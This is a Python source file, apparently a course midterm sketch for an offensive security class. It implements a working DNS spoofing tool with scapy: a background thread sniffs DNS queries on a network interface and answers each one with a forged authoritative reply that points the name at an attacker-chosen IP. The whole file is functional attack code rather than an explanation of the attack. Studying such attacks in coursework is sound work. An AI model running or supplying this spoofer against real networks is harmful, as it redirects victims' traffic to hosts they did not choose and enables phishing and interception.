"""
2IC80 Offensive Computer Security
Midterm Sketch - DNS Spoofing Tool
Date: 2025
"""

from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
import threading

# DNS spoofing as a threaded class (so it can run in the background)
class DNSSpoofer(threading.Thread):
    def __init__(self, interface, redirect_ip):
        # Start thread and store basic setup
        super().__init__()
        self.interface = interface
        self.redirect_ip = redirect_ip
        self._stop = threading.Event()  # Used to stop the thread

    def stop(self):
        # stop the loop
        self._stop.set()

    def is_stopped(self):
        return self._stop.is_set()

    def run(self):
        # listens for DNS queries and crafts spoofed replies
        def process(packet):
            # Only respond to DNS queries (qr=0)
            if packet.haslayer(DNS) and packet[DNS].qr == 0:
                query = packet[DNSQR].qname.decode().rstrip(".")
                print(f"[*] Intercepted DNS query: {query}")

                # send spoofed DNS response
                fake = self._craft_response(packet)
                send(fake, iface=self.interface, verbose=False)

        # Loop until stopped 
        while not self.is_stopped():
            sniff(
                filter="udp port 53",
                prn=process,
                iface=self.interface,
                store=0,
                timeout=1
            )

    def _craft_response(self, pkt):
        # Returns a forged DNS answer to redirect_ip
        return IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
               UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) / \
               DNS(
                   id=pkt[DNS].id,
                   qr=1,
                   aa=1,
                   qd=pkt[DNS].qd,
                   an=DNSRR(rrname=pkt[DNSQR].qname, rdata=self.redirect_ip)
               )
